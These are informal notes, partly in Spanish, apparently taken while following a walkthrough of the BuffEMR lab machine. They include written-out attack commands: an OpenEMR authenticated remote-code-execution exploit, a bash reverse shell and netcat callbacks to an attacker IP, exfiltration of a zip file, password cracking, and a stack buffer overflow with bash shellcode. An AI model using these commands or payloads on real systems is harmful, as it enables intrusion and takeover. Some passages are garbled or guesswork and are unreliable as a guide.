This is utile too, its like arpscan with the parameter of url but it is different

sudo arp-scan -I wlan0 --localnet

08:00:27 (OUI) of Virtualbox

he speaks again about mkt , and the chzrkt

ping -c 1 192.168.0.44 (cantidad 1 )

ttl 64 = linux

nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.0.44 -oN allports -oG

he uses regex (regula expressions) and he filters the ports and other things

sudo nmap -sVC -80,21,22 -p 192.168.0.44 -oN targeted

There is an script on NMAP that detects if the user Anonymous is avalaible and, in this case it is (on the 21 tcp open port) 
there is a resource called "share" and we can google it or download it or connect via ftp


THe port 22 gives us a "OpenSSH 7.6p1 Ubuntu 4ubuntu0.3", we can google it and find the "codename".. what kind of ubuntu is

OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 launchpad

https://launchpad.net/ubuntu/+source/openssh/1:7.6p1-4ubuntu0.3
"bionic"

Apache/2.4.29 (Ubuntu) we can search it too( to see the ubuntu version)
Apache/2.4.29 (Ubuntu) launchpad
https://launchpad.net/ubuntu/+source/apache2/2.4.29-1ubuntu4.4
"bionic"
It can be that in that port works a "Docker" working .. or containers with the same ubuntu bionic working, there is no garantee

Now we are going to connect on the port 21 via ftp

ftp 192.168.0.44 with the anonymous user, we are now working on the folder "content"

There is a lot of data, so we are going to download it 

wget -r ftp://192.168.0.45

tree -L 2 (we see the archives like ordered as folder, sub folders.. as a tree)

tree -L 3 the next level
tree -L 3 -fas (all the route and resources)

we have an OPENMR, and this is it

OpenEMR​ Es un software de administración de práctica médica qué también apoya Registros Médicos Electrónicos. [Wikipedia](https://es.wikipedia.org/wiki/OpenEMR)


Now, lets use whatweb and identify the website in the port 80 

whatweb https://192.168.0.45

```c
http://192.168.0.45 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[192.168.0.45], Title[Apache2 Ubuntu Default Page: It works]
```
a default page of apache .. nothing interesting

http://192.168.0.45/openemr/interface/login/login.php?site=default
/openemr

we are connected to openemr on this path

it is strange i dont know if via ftp it is up, if it is the same or maybe it is different . 
HE said , if we dont have been knowed this jus putting on the search /openmr

we can investigate it on this manner 
(in the folder of openemr)
 grep -r -i "openemr" /usr/share/SecLists 
 
 (but i do not have this resource on my pc)
 
 Now im going to watch if i can find some credentials that permites me to logg in the website 
 find \-name \*conf\* 
 
 ```c
 MR/content/192.168.0.45/share/openemr$ find \-name \*conf\* 
./config
./config/config.yaml
./sites/default/sqlconf.php
./sites/default/config.php
./.editorconfig
./portal/patient/_app_config.php
./portal/patient/_machine_config.php
./portal/patient/_global_config.php
./interface/weno/confirm.php
./Documentation/privileged_db/secure_sqlconf.php
./library/js/nncustom_config.js
./library/sqlconf.php

 ```
 we are going to see this
 ./sites/default/sqlconf.php 
 
 ```c
 cat ./sites/default/sqlconf.php
<?php
//  OpenEMR
//  MySQL Config

$host   = 'localhost';
$port   = '3306';
$login  = 'openemruser';
$pass   = 'openemruser123456';
$dbase  = 'openemr';

//Added ability to disable
//utf8 encoding - bm 05-2009
global $disable_utf8_flag;
$disable_utf8_flag = false;

$sqlconf = array();
global $sqlconf;
$sqlconf["host"]= $host;
$sqlconf["port"] = $port;
$sqlconf["login"] = $login;
$sqlconf["pass"] = $pass;
$sqlconf["dbase"] = $dbase;
//////////////////////////
//////////////////////////
//////////////////////////
//////DO NOT TOUCH THIS///
$config = 1; /////////////
//////////////////////////
//////////////////////////
//////////////////////////
?>
```

he said that isnt help right now to logg in, because it will help us when we logg into the machine and elevate our privileges


now we use find . (all the "recursos de primeras")

this is strange 

./tests/test.accounts

```
this is the test admin account:
admin:Monster123
```

we log in and this is the version :

Version Number: v5.0.1 (3).
We are going to search an exploit

searchsploit openmr 5.0.1
```c
searchsploit openemr 5.0.1
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
OpenEMR 5.0.1 - 'controller' Remote Code Execution                                                                                  | php/webapps/48623.txt
OpenEMR 5.0.1 - Remote Code Execution (1)                                                                                           | php/webapps/48515.py
OpenEMR 5.0.1 - Remote Code Execution (Authenticated) (2)                                                                           | php/webapps/49486.rb
OpenEMR 5.0.1.3 - 'manage_site_files' Remote Code Execution (Authenticated)                                                         | php/webapps/49998.py
OpenEMR 5.0.1.3 - 'manage_site_files' Remote Code Execution (Authenticated) (2)                                                     | php/webapps/50122.rb
OpenEMR 5.0.1.3 - (Authenticated) Arbitrary File Actions                                                                            | linux/webapps/45202.txt
OpenEMR 5.0.1.3 - Authentication Bypass                                                                                             | php/webapps/50017.py
OpenEMR 5.0.1.3 - Remote Code Execution (Authenticated)                                                                             | php/webapps/45161.py
OpenEMR 5.0.1.7 - 'fileName' Path Traversal (Authenticated)                                                                         | php/webapps/50037.py
OpenEMR 5.0.1.7 - 'fileName' Path Traversal (Authenticated) (2)                                                                     | php/webapps/50087.rb
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------```
I have credentials so i will use Remote Code Execution

we downloaded the script with

searchsploit -m (path of the xploit). 

he said that this seems like an massive assigment attack. 

"mass and assigment attack"
"asignaciones masivas"

se puede meter un proxy para ver mas detalles del exploit
![[addingthburpsuit.png]]
(in the picture he is adding the burpsuit in the exploit)


```
python3 openemr_exploit.py 
usage: openemr_exploit.py [-h] [-u USER]
                          [-p PASSWORD]
                          [-c CMD]
                          host
openemr_exploit.py: error: the following arguments are required: host

```
this is required
python 3 gives us error
python2.7 openemr_exploit.py -u admin -p Monster123 -c "whoami" http://192.168.0.46/openemr

as we allways do, we are going to listen with netcat on 443 port and waiting if we can make a reverse shell, and we are going if we can sent the whoami by netcat to my ip

python2.7 openemr_exploit.py -u admin -p Monster123 -c "whoami | nc 192.168.0.22 443" http://192.168.0.46/openemr

There is conectivity so.. lets try a remote bash

python2.7 openemr_exploit.py -u admin -p Monster123 -c "bash -i >& /dev/tcp/192.168.0.22/443 0>&1" http://192.168.0.47/openemr

TRATAMIENTO DE LA TTI

script /dev/null -c bash

now ctrl+z

stty raw -echo; fg

reset xterm

(this is for build an interactive console and we can to ctrl+c without problems)

echo $TERM 

dumb

we need to change it 

export TERM=xterm

and ctrl +l works.. and "clear"

and the proportions of  nano this guy changes it

(this way we see)
stty size

(with this way we modify)
stty rows 44 columns 80 

```
cd /home

buffenr
```
the user buffener (a privileged user)

we need to have his credentials.. 

and then the sudo credentials

sudo ls -l (i have no permission)

lsb_release -a
(ubuntu bionic)

ip a (the ip of the pc)

lets find permisions SUID

(on the first folder)

find \-perm -4000 -user root  2>/dev/null

(vamos a elevar nuestro privilegio a travez de algun binario que sea ssuid y el propietario sea root)


./usr/bin/pkexec (este es el mas facil me parece, pero no lo quiso explotar)

#pwnkid 

he is trying to watch more on the openemr ( in the resources folder , wyere we work on)

(filtering on the words of the archives)
-r (recursiva) -i (case insensitive) -E (nose para que es la e)
```
grep -r -i "password|pass|key|user"
```
everithing can be compacted
```
grep -riE "password|pass|key"
```
this returns many things

but we found this, and we are going to decode with base64
```
"c2FuM25jcnlwdDNkCg==" | base64 -d; echo
san3ncrypt3d
```
but it is not the password of buffener

On the victims machine we are going to see the directory /var

He says that we are going to listen again on netcat .. because its a strange arcgive called user.zip


(todo lo que envie por netcat lo va a guardar en el archivo user.zip)

nc -nlvp 443 > user.zip

now.. from the victim machine i transfer for me the user.zip

nc 192.168.0.22 443 < user.zip

it is ok, now he is going to see if there is an integrity on the data lost 
md5sum user.zip

on my pc 
4c9f153d14808c1844b989c86c3980f4
on the target
4c9f153d14808c1844b989c86c3980f4

The same, lets see wat it have inside 

7z l user.zip 
```
7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_ES.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Celeron(R) CPU N3350 @ 1.10GHz (506C9),ASM,AES-NI)

Scanning the drive for archives:
1 file, 309 bytes (1 KiB)

Listing archive: user.zip

--
Path = user.zip
Type = zip
Physical Size = 309

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2021-06-21 20:11:18 .....          146          127  user.lst
------------------- ----- ------------ ------------  ------------------------
2021-06-21 20:11:18                146          127  1 files

```

7z x user.zip (needs a password)

and we are going to use Jontheripper and we get a hash

zip2john user.zip

VOY A TRATAR DE CRAKEAR EL HASH OFLINE APLICANDO FUERZABRUTA A VER SI LA CONTRASEÑA ESTA EN UN DICCIONARIO PARA LUEGO DESCOMPRIMIR EL COMPRIMIDO

(metemos el hash en un archivo llamado hash, ahora usamos john)
zip2john user.zip > hash

and it doesnt find nothing

john -w:/usr/share/wordlists/rockyou.txt hash

maybe ...

san3ncrypt3d  , it is .. but is the encrypted one



```
This file contain senstive information, therefore, should be always encrypted at rest.

buffemr - Iamgr00t

****** Only I can SSH in ************
```

we cat the user.txt flag.. now we must be the root 

id (this gives a lot of information about our groups and other stuffs)
```
buffemr@buffemr:~$ id
uid=1000(buffemr) gid=1000(buffemr) groups=1000(buffemr),4(adm),24(cdrom),30(dip),46(plugdev),116(lpadmin),126(sambashare)
```


WE are in the group adm, so we can list some "logs" in the system

ls -l /var/log/ (we can see this, the "adm" ones)

find / -group adm 2>/dev/null (this searchs some ones)

find / -group adm 2>/dev/null | grep -v proc (this removes the proc ones)

sudo -l ... this user have no privileges as sudo 

Again lets make a scan for privileges SUID 
We must do this allways when we have prigileges on every user that we gain access
find  -perm -4000 2>/dev/null

./opt/dontexecute (a file compiled of 32 bits an the propietary is user

This asks us for an argument 

./opt/dontexecute; echo 
Usage ./dontexecute argument

(prueba basica de buffer overflow(?))

DIce que el script cuando pide un argumento, da un limite de bites.. pero si no esta bien controlado, se puede modificar los parametros
el programa peta, cuado te pasas, escribis sobre otros registros.

nc -nlvp 443 > binary

nc 192.168.100.4 443 < /opt/dontexecute


(DICE QUE TIRA DE GEF)
Gdb enhanced ... o PEDA 
now gdb -q ./binary 

we install gdb and ... wit -r we execute it 

```
(gdb) r
Starting program: /home/cds/Documentos/Workspace/Virtual machines/pentesting/BuffEMR/content/binary 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Usage: ./dontexecute argument[Inferior 1 (process 25189) exited with code 01]
(gdb) 
```

You can use a pattern create on gbd... the idea is overwrite in the "ebp" or "ret" ????... the question is .. how many characters i need to overwrite this field.

i need to transform the "eip" place

gef > r (r is the comand to execute the program)
pattern create makes a pattern and we can know where is the field "eip"

this command filters the space that we need to knkow 

```c
echo "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak" | grep --color daaf
```

now i use 
```
pattern offset $eip

```
it returns me 512 to get to the $eip place

r $(python3 -c 'print("A"*512 +"B"*4)')

So in that place $eip is BBBB

lo que hace en esa parte es redirigir el programa.. pero en BBBB  POR AHORA NO HAY NADA

checksec(we can se the protections of the program

```
gef➤  checksec
[+] checksec for '/home/cds/Documentos/Workspace/Virtual machines/pentesting/BuffEMR/content/binary'
Canary                        : ✘ 
NX                            : ✘ 
PIE                           : ✓ 
Fortify                       : ✘ 
RelRO                         : Full
gef➤  
```

NX is unnactive (no execution)

deberiamos introducir secuencias maliciosas, (shellcode)

SI metemos codigos maliciosos antes de el $eip me lo deberia interpretar, ya que no hay proteccion contra ejecucion.

SI estuviera habilitado NX , habria otra teccinca, que se llama redtulip c (?) o algo asi y otras tecnicas mas  (RED TOOL IPC)

mete un \x90 x 512,  eso es "no operation code"

we google a shell code 
on 32 bits
https://shell-storm.org/shellcode/files/shellcode-606.html

on the target machine we must put this

```
buffemr@buffemr:/$ cd /opt/
buffemr@buffemr:/opt$ ls
dontexecute
buffemr@buffemr:/opt$ which gdb
/usr/bin/gdb
buffemr@buffemr:/opt$ gdb ./dontexecute -q
```

and now 
```
r $(python -c 'print "A"*512 + "B"*4')
```

it returned this 
```
Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) 
```
so, the value of eib is 42424242

with i r we can se things
```
(gdb) i r
eax            0xffffd14c       -11956
ecx            0xffffd770       -10384
edx            0xffffd34f       -11441
ebx            0x41414141       1094795585
esp            0xffffd350       0xffffd350
ebp            0x41414141       0x41414141
esi            0xf7e31000       -136114176
edi            0x0      0
eip            0x42424242       0x42424242
eflags         0x10282  [ SF IF RF ]
cs             0x23     35
ss             0x2b     43
ds             0x2b     43
es             0x2b     43
fs             0x0      0
gs             0x63     99
(gdb) 
```

Necesitamos restarle a 512-33bytes que vale el codigo shell

echo "512-33" | bc
479


this is the code 
```
$(python -c 'print "\x90"*479 +"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "B"*4')
```
but the $eib must redirect to some place.. where? to execute the script in bits

TODO ESO ESTA EN EL STACK ESP (el codigo malicioso) 


x/300wx $esp
sirve para ver las instrucciones enviadas


0xffffd4a0: (ddebe ponerse todo al revez donde salen las BBB
0xffffd620:
\x20\xd6\xff\xff\
```
$(python -c 'print "\x90"*512 +"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "\x20\xd6\xff\xff\"')
```
this direction doesnt work we are going to try with another
\x70\xd6\xff\xff\

```
r $(python -c 'print "\x90"*479 +"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "\x70\xd6\xff\xff"')

```

r $(python -c 'print "\x90"*479 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "\xb0\xd6\xff\xff\"')


0xffffd640
\x40\xd6\xff\xff\

0xffffd6b0:

\xb0\xd6\xff\xff\


la idea es ejecutarlo afuera del gdb


r $(python -c 'print "\x90"*479 +"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "\x70\xd6\xff\xff\"')

CUIDADO CON LA BARRITA DEL FINAL, POR ESO NO FUNCIONABA!!!!!!!


MUCHO CUIDADO CON EJECUTAR ADENTRO EL DE GDB el programa una vez ya ejecutado.. se hace como un bucle extraño y dice que hay ilegalidades, no se que cosa.

#BUFFER-OVERFLOW


SKILLS :
- FTP Enumeration
- Information Leakage
- OpenEMR 5.0.1.3 - Remote Code Execution (Authenticated)
- Buffer Overflow x32 - Stack based [Linux x86 shellcode - execve("/bin/bash", ["/bin/bash", "-p"], NULL) - 33 bytes]

CERTIFICATIONS:

eWPT
Buffer Overflow

